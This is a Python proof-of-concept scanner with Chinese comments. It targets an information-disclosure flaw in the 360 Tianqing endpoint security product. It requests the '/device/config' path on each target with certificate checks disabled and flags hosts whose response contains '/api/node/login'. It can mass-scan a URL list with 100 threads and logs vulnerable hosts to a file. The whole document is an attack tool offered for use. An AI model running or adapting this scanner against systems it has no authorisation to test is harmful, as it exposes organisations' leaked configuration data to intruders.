# 导入所需的模块  
import argparse, sys, requests, time  
from multiprocessing.dummy import Pool  
  
# 禁用urllib3的警告（当requests库进行HTTPS请求时可能会产生）  
requests.packages.urllib3.disable_warnings()  
  
# 定义漏洞检测函数  
def poc(target):  
    # 构造URL（基于给定的target，并添加'/device/config'路径）  
    url = target + '/device/config'  
      
    # 设置HTTP请求头  
    headers = {  
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"  
    }  
      
    # 初始化响应内容为空字符串  
    res = ""  
      
    try:  
        # 发送GET请求并获取响应内容  
        res = requests.get(url, headers=headers, verify=False, timeout=5).text  
          
        # 检查响应内容中是否包含'/api/node/login'字符串，如果是，则认为存在漏洞  
        if '/api/node/login' in res:  
            print(f"[+] {target} 漏洞存在")  
            # 将存在漏洞的target写入result.txt文件  
            with open("result.txt", "a+", encoding="utf-8") as f:  
                f.write(target + "\n")  
        else:  
            print(f"[-] {target} 漏洞不存在")  
    except:  
        # 如果发生异常（如网络错误、超时等），则打印服务器错误信息  
        print(f"[*] {target} 服务器错误")  
  
# 主函数  
def main():  
    # 创建一个ArgumentParser对象，用于处理命令行参数  
    parser = argparse.ArgumentParser(description='这是针对360新天擎信息泄露的POC脚本！')  
      
    # 添加命令行参数'-u'或'--url'，用于指定单个URL  
    parser.add_argument('-u', '--url', dest='url', type=str, help='URL链接')  
      
    # 添加命令行参数'-f'或'--file'，用于指定包含多个URL的文件路径  
    parser.add_argument('-f', '--file', dest='file', type=str, help='文件名.txt（绝对路径）')  
      
    # 解析命令行参数  
    args = parser.parse_args()  
      
    # 如果指定了URL且未指定文件，则对单个URL进行漏洞检测  
    if args.url and not args.file:  
        poc(args.url)  
      
    # 如果未指定URL但指定了文件，则对文件中的每个URL进行多线程漏洞检测  
    elif not args.url and args.file:  
        url_list = []  
        with open(args.file, "r", encoding="utf-8") as f:  
            for url in f.readlines():  
                # 去除URL前后的空格和换行符，并添加到列表中  
                url_list.append(url.strip().replace("\n", ""))  
          
        # 创建一个线程池，并设置线程数为100  
        mp = Pool(100)  
          
        # 使用线程池对列表中的每个URL进行漏洞检测  
        mp.map(poc, url_list)  
          
        # 关闭线程池并等待所有线程完成  
        mp.close()  
        mp.join()  
      
    # 如果既未指定URL也未指定文件，则打印用法信息  
    else:  
        print(f"用法：\n\t python3 {sys.argv[0]} -h")  

# 如果该脚本作为主程序运行，则调用main函数  
if __name__ == '__main__':  
    main()
